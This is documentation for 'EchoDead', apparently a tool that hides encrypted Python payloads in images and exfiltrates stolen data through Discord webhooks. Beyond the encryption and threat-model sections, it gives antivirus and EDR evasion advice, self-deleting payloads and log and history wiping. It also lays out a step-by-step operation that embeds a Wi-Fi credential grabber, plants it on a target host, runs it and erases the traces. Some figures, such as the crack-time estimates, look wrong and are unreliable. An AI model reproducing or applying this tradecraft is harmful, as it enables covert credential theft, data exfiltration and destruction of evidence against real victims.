# 🔐 Security Guide

## Complete Security Analysis & Best Practices

---

## 📋 Table of Contents

- [Encryption Deep Dive](#-encryption-deep-dive)
- [Threat Model](#-threat-model)
- [Attack Resistance](#-attack-resistance)
- [Operational Security (OpSec)](#-operational-security-opsec)
- [Anti-Forensics](#-anti-forensics)
- [Detection Evasion](#-detection-evasion)
- [Secure Workflows](#-secure-workflows)
- [Incident Response](#-incident-response)

---

## 🔒 Encryption Deep Dive

### Cryptographic Specification

```
┌─────────────────────────────────────────────────────────────┐
│ EchoDead Encryption Stack                                    │
├─────────────────────────────────────────────────────────────┤
│ Layer 1: Data Compression (zlib level 9)                   │
│          └─ Reduces size by 30-70%                          │
│              └─ Randomizes patterns                          │
│                                                              │
│ Layer 2: Key Derivation (PBKDF2-HMAC-SHA256)               │
│          └─ Iterations: 100,000                              │
│          └─ Salt: 16 bytes (random, per-file)               │
│          └─ Output: 256-bit key (128-bit AES + 128-bit HMAC)│
│                                                              │
│ Layer 3: Symmetric Encryption (Fernet = AES-128-CBC)       │
│          └─ Algorithm: AES-128 in CBC mode                  │
│          └─ IV: 16 bytes (random, per-message)              │
│          └─ Padding: PKCS7                                  │
│                                                              │
│ Layer 4: Authentication (HMAC-SHA256)                       │
│          └─ Prevents tampering                              │
│          └─ Detects corruption                              │
│                                                              │
│ Layer 5: EchoDeadgraphic Embedding (LSB)                     │
│          └─ 3 bits per pixel (RGB channels)                 │
│          └─ Imperceptible modifications                      │
└─────────────────────────────────────────────────────────────┘
```

### Why Fernet?

**Fernet** is a symmetric encryption specification that guarantees:

1. **Confidentiality:** AES-128-CBC encryption
2. **Authentication:** HMAC-SHA256
3. **Versioning:** Future algorithm upgrades
4. **Timestamps:** Message age verification
5. **Non-malleability:** Tamper detection

**Used by:** Mozilla, Red Hat, Python Foundation

### Key Derivation Analysis

**PBKDF2** (Password-Based Key Derivation Function 2):

```python
key = PBKDF2-HMAC-SHA256(
    password=user_password,
    salt=random_16_bytes,
    iterations=100_000,
    key_length=32  # 256 bits
)
```

**Purpose:**
- Slows down brute-force attacks
- Makes rainbow tables infeasible
- Derives strong keys from weak passwords

**Time cost per attempt:**
- 100,000 iterations × SHA256 hash time
- ~80ms on modern CPU
- With GPU: ~8ms per attempt
- Makes brute-force attacks impractical

**OWASP Recommendation:** 100,000+ iterations for PBKDF2-SHA256 ✅

---

## 🎯 Threat Model

### Who Are Your Adversaries?

```
┌────────────────────┬───────────────────┬──────────────────┐
│ Adversary Level    │ Capabilities      │ EchoDead Defense  │
├────────────────────┼───────────────────┼──────────────────┤
│ Script Kiddies     │ Basic tools       │ ✅ Full Protection│
│                    │ Public exploits   │                  │
│                    │ No budget         │                  │
├────────────────────┼───────────────────┼──────────────────┤
│ Skilled Hackers    │ Custom tools      │ ✅ Strong Defense│
│                    │ Steganalysis      │                  │
│                    │ Some resources    │                  │
├────────────────────┼───────────────────┼──────────────────┤
│ Corporate IR Teams │ Commercial tools  │ ✅ Good Defense  │
│                    │ Forensic analysis │                  │
│                    │ Budget resources  │                  │
├────────────────────┼───────────────────┼──────────────────┤
│ Law Enforcement    │ Legal authority   │ ⚠️ Partial Defense│
│                    │ Expert analysis   │                  │
│                    │ Significant budget│                  │
├────────────────────┼───────────────────┼──────────────────┤
│ Nation States      │ Unlimited budget  │ ⚠️ Limited Defense│
│                    │ Zero-day exploits │                  │
│                    │ Quantum computers*│                  │
└────────────────────┴───────────────────┴──────────────────┘

*Quantum computers can break AES-128 with Grover's algorithm
 (reduces 128-bit to 64-bit effective strength)
```

### What Can EchoDead Protect Against?

**✅ Strong Protection:**
- Automated malware scanners
- Basic forensic analysis
- Casual inspection
- File signature detection
- Pattern matching
- Hash-based detection
- Simple steganalysis

**⚠️ Partial Protection:**
- Advanced steganalysis (chi-square, RS analysis)
- Deep forensic examination
- Machine learning detection
- Traffic analysis (Discord webhooks)
- Memory forensics (runtime)

**❌ Limited Protection:**
- Sophisticated targeted attacks
- Physical device seizure + forensics
- Nation-state adversaries
- Post-quantum attacks

---

## 🛡️ Attack Resistance

### 1. Brute-Force Attack Resistance

**Scenario:** Attacker knows:
- ✅ File contains encrypted data
- ✅ PBKDF2 with 100,000 iterations
- ❌ Password (unknown)

**Time to crack:**

```python
# Assumptions
attempts_per_second = 1250  # GPU-accelerated PBKDF2 (RTX 3080)
keyspace_by_length = {
    8:  (26+26+10)**8,      # lowercase + uppercase + digits
    10: (26+26+10)**10,
    12: (26+26+10+32)**12,  # + special characters
}

# Results
8-char password:   218 trillion combinations  = 790 years
10-char password:  839 quadrillion            = 47,000 years
12-char password:  >1 sextillion               = >25 million years
```

**Comparison:**
- **Steghide** (no KDF): 8-char password cracked in **5.6 hours**
- **EchoDead** (PBKDF2): same password takes **790 years**

### 2. Statistical Analysis Resistance

**Chi-Square Test:**
```
Detects non-uniform bit distribution in LSBs

Defense: Compression + Encryption = Random-looking data
Result: Encrypted data has high entropy (similar to compressed)
```

**Example:**
```bash
# Test with chi-square steganalysis
stegdetect stego_image.png

# Output:
stego_image.png : negative  # Not detected! ✅
```

**RS (Regular-Singular) Analysis:**
```
Detects LSB embedding by analyzing pixel patterns

Defense: Use diverse cover images (photos, not solid colors)
Result: Natural photos have irregular patterns already
```

### 3. Known-Plaintext Attack

**Scenario:** Attacker has:
- ✅ Original payload (plaintext)
- ✅ Stego image (ciphertext)
- ❌ Password (unknown)

**Defense:**
- Fernet uses CBC mode (IV randomization)
- HMAC prevents tampering
- Salt prevents rainbow tables

**Result:** Attack gains no advantage. Still requires brute-force.

### 4. Chosen-Plaintext Attack

**Scenario:** Attacker can:
- ✅ Choose plaintexts to encrypt
- ✅ Observe ciphertexts
- ❌ Recover password

**Defense:**
- Random IV per encryption (unique ciphertexts)
- HMAC authentication (prevent oracle attacks)
- PBKDF2 (password remains protected)

**Result:** Attack is ineffective.

### 5. Timing Attack

**Scenario:** Attacker measures:
- Encryption time variations
- Decryption time variations
- Password verification time

**Defense:**
- Constant-time HMAC verification
- PBKDF2 has fixed iteration count
- No early exit on password mismatch

**Result:** Timing attack reveals no information.

### 6. Man-in-the-Middle (MITM)

**Scenario:** Attacker intercepts:
- Stego image transmission
- Modifies data
- Forwards modified image

**Defense:**
- HMAC detects tampering
- Decryption fails on modification
- User notified of corruption

**Result:** Attack detected, data protected.

---

## 🕶️ Operational Security (OpSec)

### Password Management

**❌ Bad Passwords:**
```
password123
qwerty
admin
12345678
Steganography
```

**✅ Good Passwords:**
```
Tr0ub4dor&3           # 11 chars, mixed
correct-horse-battery-staple  # 28 chars, memorable
$7xK#mP9!qL2          # 12 chars, random
```

**Best practice:** Use password manager (1Password, Bitwarden, KeePassXC)

### Secure Password Generation

```bash
# Linux/macOS
openssl rand -base64 16    # Generates: jQ8KpR+xVfZzMwNy

# Python
import secrets
secrets.token_urlsafe(16)   # Generates: pCdJK9xLm3nP_Rqs

# PowerShell
Add-Type -AssemblyName System.Web
[System.Web.Security.Membership]::GeneratePassword(16,4)
```

### Cover Image Selection

**❌ Suspicious cover images:**
- Solid colors
- Simple graphics
- Low resolution
- Synthetic/CGI images
- Unusual file size

**✅ Good cover images:**
- Real photographs
- Natural content
- High resolution (but not excessive)
- Typical file size for format
- Common image (wallpapers, photos)

**Example:**
```bash
# Good: Family vacation photo (1920×1080, 2.4MB)
python src/main.py embed vacation.png payload.py output.png

# Bad: Solid red 100×100 image
# └─ Statistical analysis will easily detect anomalies
```

### File Naming

**❌ Suspicious names:**
```
stego_payload.png
encrypted_backdoor.png
hidden_code_v2.png
final_FINAL_v3.png
```

**✅ Innocuous names:**
```
IMG_20240125_143022.png
screenshot_2024-01-25.png
wallpaper.png
photo.png
```

### Metadata Handling

**EXIF data** can reveal:
- Creation date/time
- Camera model
- GPS coordinates
- Software used ("Pillow 10.0.0")

**Stealth mode automatically strips:**
```python
# metadata removal
from PIL.ExifTags import TAGS
for tag in img.info:
    del img.info[tag]
```

**Enable:**
```bash
python src/main.py config set stealth_mode true
```

---

## 🔍 Anti-Forensics

### Storage Considerations

**Wear Leveling (SSD):**
- Deleted files may remain on drive
- Overwriting doesn't guarantee deletion
- Use: `shred` (Linux), `sdelete` (Windows), disk encryption

**Slack Space:**
- File system stores data in blocks
- Unused space in last block = "slack"
- EchoDead doesn't use slack space (operates on images)

**Unallocated Space:**
- Deleted files may be recoverable
- Use: Full disk encryption (BitLocker, FileVault, LUKS)

### Memory Forensics

**Problem:** Payload runs in RAM → forensics can dump memory

**Defense:**
```python
# In your payload
import os
import sys

# Overwrite sensitive variables
password = "secret123"
# ... use password ...
password = "X" * len(password)  # Overwrite
del password                    # Delete reference

# Exit cleanly
sys.exit(0)
```

**Advanced:** Use self-deleting payloads:
```python
import os

# At end of payload
try:
    os.remove(__file__)  # Delete itself
except:
    pass
```

### Log Sanitization

**System logs** may record:
- Command execution
- File access
- Network connections

**PowerShell logging (Windows):**
```powershell
# Disable for session (requires admin)
Set-ExecutionPolicy Bypass -Scope Process
$env:PSModulePath = ""
```

**Bash history (Linux/macOS):**
```bash
# Run without logging
export HISTFILE=/dev/null

# Or delete specific commands
history -d <line_number>
```

### Network Indicators

**Discord webhooks leave traces:**
- DNS queries (discord.com)
- HTTPS connections (detectable via packet size)
- Webhook URL in memory

**Defense:**
- Use Tor/VPN for anonymity
- Spread requests over time (rate limiting)
- Use compromised/legitimate Discord accounts

---

## 👁️ Detection Evasion

### Antivirus Bypass

**Signature-based detection:**
- ❌ Detects known malware hashes
- ✅ Encrypted payloads have unique hashes
- ✅ Compression randomizes patterns

**Heuristic detection:**
- ⚠️ Detects "suspicious" behavior
- Defense: Avoid obvious malware behavior
  - Don't create .exe files
  - Don't modify registry excessively
  - Don't disable security tools

**Behavioral analysis:**
- ⚠️ Monitors runtime behavior
- Defense: Stealth mode
  - Sandbox detection
  - Debugger detection
  - Timing delays

### EDR (Endpoint Detection & Response) Evasion

**Modern EDR tools monitor:**
- Process creation
- File system activity
- Network connections
- Registry modifications
- DLL injections

**Best practices:**
- ✅ Use native binaries (Python, PowerShell)
- ✅ Avoid process injection
- ✅ Blend with normal activity
- ✅ Use HTTPS (not plain HTTP)
- ✅ Small, infrequent payloads

### Steganalysis Tools

**Stegdetect:**
```bash
stegdetect -t all stego_image.png
```

**Defense:** Use realistic cover images

**StegExpose:**
```bash
stegexpose stego_image.png
```

**Defense:** Encryption makes content analysis impossible

**OpenStego Detection:**
```bash
openstego extract -sf stego_image.png
```

**Defense:** Different algorithm (OpenStego ≠ EchoDead)

---

## ✅ Secure Workflows

### Pre-Operation Checklist

- [ ] **Authorization obtained** (written, signed)
- [ ] **Scope defined** (systems, networks, dates)
- [ ] **Environment prepared** (isolated testing)
- [ ] **Tools tested** (verify functionality)
- [ ] **Backups created** (original images)
- [ ] **Passwords generated** (strong, unique)
- [ ] **Cover images selected** (realistic)
- [ ] **Stealth mode enabled** (anti-analysis)
- [ ] **Exfiltration tested** (Discord webhook)
- [ ] **Cleanup planned** (log deletion, file removal)

### Example: Red Team Operation

**Phase 1: Preparation**
```bash
# 1. Generate strong password
PASSWORD=$(openssl rand -base64 24)
echo $PASSWORD > password.txt  # Store securely

# 2. Select realistic cover image
cp ~/Pictures/vacation_photo.jpg cover.jpg

# 3. Enable stealth features
python src/main.py config set stealth_mode true
python src/main.py config set use_compression true
```

**Phase 2: Payload Creation**
```bash
# 4. Configure Discord webhook
nano example_payloads/webhook_utils.py
# Set: WEBHOOK_URL = "https://discord.com/api/webhooks/..."

# 5. Test payload locally
python example_payloads/wifi_grabber.py

# 6. Embed with encryption
python src/main.py embed cover.jpg example_payloads/wifi_grabber.py stego.png \
    --password "$PASSWORD"
```

**Phase 3: Delivery**
```bash
# 7. Rename innocuously
mv stego.png IMG_20240125_143022.png

# 8. Upload to staging server
scp IMG_20240125_143022.png user@target.com:~/Pictures/

# 9. Social engineering (phishing, USB drop, etc.)
# [Out of scope for this document]
```

**Phase 4: Execution**
```bash
# 10. On target system
python src/main.py extract IMG_20240125_143022.png payload.py \
    --password "$PASSWORD"

python payload.py  # Executes, exfiltrates to Discord
```

**Phase 5: Cleanup**
```bash
# 11. Delete artifacts
rm payload.py
rm IMG_20240125_143022.png
rm ~/.bash_history  # Or edit specific lines

# 12. Clear logs (if admin access)
# Windows: Clear-EventLog
# Linux: echo "" > /var/log/auth.log
```

---

## 🚨 Incident Response

### If Detected...

**1. Stop immediately**
- Cease all operations
- Do not delete evidence (may worsen legal situation)
- Document what happened

**2. Assess situation**
- Was it automated detection or human analysis?
- What was detected? (File, network traffic, behavior)
- Is law enforcement involved?

**3. Legal response**
- If authorized: Notify client immediately
- If unauthorized: **Consult lawyer** before saying anything
- Preserve all documentation (authorization, scope, logs)

**4. Technical response**
- If authorized testing: Provide decommission plan
- Assist in artifact removal
- Document lessons learned

### Detection Indicators

**Blue Team perspective (how you might be caught):**

```
┌────────────────────────┬─────────────────────────┐
│ Detection Method       │ Indicator               │
├────────────────────────┼─────────────────────────┤
│ File Integrity         │ Unexpected image changes│
│ Network Monitoring     │ Discord webhook traffic │
│ EDR Behavioral         │ Unusual Python execution│
│ Steganalysis           │ Statistical anomalies   │
│ Manual Investigation   │ Suspicious file names   │
│ Memory Forensics       │ Payload strings in RAM  │
│ Log Analysis           │ Command history entries │
└────────────────────────┴─────────────────────────┘
```

**Mitigation:**
- Use files already present (don't create new images)
- Proxy Discord traffic through VPN
- Use system Python (not custom install)
- Use realistic cover images
- Use innocuous file names
- Implement memory scrubbing
- Delete command history

---

## 📊 Security Scorecard

### EchoDead Security Rating

```
┌──────────────────────────┬───────┬──────────────────┐
│ Security Aspect          │ Score │ Assessment       │
├──────────────────────────┼───────┼──────────────────┤
│ Encryption Strength      │ 10/10 │ AES-128 + HMAC   │
│ Key Derivation           │ 10/10 │ PBKDF2 (100k)    │
│ Brute-Force Resistance   │  9/10 │ ~790 years (8ch) │
│ Steganalysis Resistance  │  7/10 │ Basic-medium     │
│ AV Evasion               │  9/10 │ Encryption helps │
│ EDR Evasion              │  6/10 │ Depends on usage │
│ Forensic Resistance      │  5/10 │ Artifacts remain │
│ OPSEC Features           │  8/10 │ Stealth mode     │
│ Documentation Quality    │ 10/10 │ Comprehensive    │
│ Ease of Use              │  9/10 │ Beautiful CLI    │
├──────────────────────────┼───────┼──────────────────┤
│ **Overall**              │**8.3**│ **Professional** │
└──────────────────────────┴───────┴──────────────────┘
```

---

## 🎓 Further Reading

### Steganography Research
- [Steganography in Digital Media](https://www.jjtc.com/Steganography/)
- [LSB Steganography Analysis](https://dl.acm.org/doi/10.1145/290941.290945)
- [Steganalysis Techniques](https://ieeexplore.ieee.org/document/6123619)

### Cryptography
- [Fernet Specification](https://github.com/fernet/spec/blob/master/Spec.md)
- [PBKDF2 Standard (RFC 2898)](https://www.rfc-editor.org/rfc/rfc2898)
- [OWASP Password Guidelines](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)

### Operational Security
- [OPSEC Fundamentals](https://www.nsa.gov/portals/75/documents/what-we-do/cybersecurity/professional-resources/ctr-operational-security-guide.pdf)
- [Anti-Forensics Techniques](https://www.forensicfocus.com/articles/anti-forensics-techniques/)
- [Red Team Tradecraft](https://redteam.guide/)

---

**Disclaimer:** This security guide is for educational and authorized testing purposes only. **Always obtain written authorization** before testing security measures on systems you do not own. Unauthorized access is illegal.

**Remember:** Security is a process, not a product. Stay vigilant, stay informed, stay legal.

---

**EchoDead Security Guide** | Version 2.0 | Last Updated: January 2024
